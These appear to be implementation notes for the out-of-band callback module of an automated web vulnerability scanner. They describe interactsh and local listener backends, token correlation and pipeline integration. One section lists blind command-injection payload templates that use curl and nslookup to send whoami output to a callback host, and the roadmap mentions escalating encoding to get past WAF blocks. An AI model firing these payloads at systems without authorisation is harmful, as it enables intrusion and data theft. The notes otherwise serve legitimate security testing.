# OOB (Out-of-Band) Integration — Implementation Notes

## Architecture

```
OOBClient (unified interface)
  ├── InteractshBackend (default, external targets)
  │     - spawns `interactsh-client -json -v` subprocess
  │     - reads stdout for base domain + JSON interactions
  │     - correlates hits by token (subdomain prefix)
  │     - auto-detects domain from startup log (oast.*/interact.*/live.*/fun.*)
  │     - 15s startup timeout
  └── LocalBackend (fallback, internal network)
        - raw TCP listener on configurable port
        - parses HTTP method/path/headers from raw bytes
        - token = first path segment

Auto-selection: tries interactsh first → falls back to local if binary missing
```

## Token Flow

1. Module calls `oob.generate_token()` → gets unique 10-char hex
2. Module calls `oob.get_url(token)` → `http://{token}.{base_domain}` (interactsh) or `http://host:port/{token}` (local)
3. Module calls `oob.get_url(token, protocol="dns")` → bare subdomain for DNS-only callbacks
4. Module sends payload containing OOB URL to target
5. Module calls `await oob.check_hit(token, wait=5.0)` → polls with 1s interval up to wait seconds
6. If hit: `await oob.poll(token)` → list of OOBHit with source_ip, protocol, request, raw data

## Payload Template Pattern

In `payloads/bypasses.py`, blind payloads use format-string placeholders:
```python
"& curl {OOB_URL}/?d=$(whoami) &"
"$(nslookup $(whoami).{OOB_DOMAIN})"
```

Modules render these at runtime:
```python
payload.format(OOB_URL=oob.get_url(token), OOB_DOMAIN=oob.get_url(token, "dns"))
```

## Hunt Pipeline Integration

```python
# hunt.py checks if any module needs OOB
has_oob_modules = any(m.needs_oob for m in modules)
if has_oob_modules:
    oob = OOBClient()
    await oob.start()

# passes to every module (None-safe)
m.run(target, surface, client, oob=oob)

# cleanup after all modules done
if oob:
    await oob.stop()
```

## Adding Blind Detection to a Module

```python
class MyModule(BaseModule):
    name = "mymod"
    needs_oob = True  # triggers OOB startup in hunt

    async def run(self, target, surface, client, oob=None):
        # ... in-band checks first ...
        if oob:
            token = oob.generate_token()
            url = oob.get_url(token)
            # send payload with url
            await client.get(endpoint, params={"x": f"...{url}..."})
            # check for callback
            if await oob.check_hit(token, wait=5.0):
                hits = await oob.poll(token)
                # create confirmed finding
```

## Roadmap (not yet implemented)

1. **Evidence capture** — full req/res logging per finding in output/<run_id>/evidence/
2. **Auth refresh** — auto-detect 401, refresh JWT/OAuth tokens mid-scan
3. **Dual-cookie IDOR** — user-A/user-B token for proper horizontal privesc testing
4. **Payload feedback loop** — track WAF blocks, skip known-blocked payloads, escalate encoding
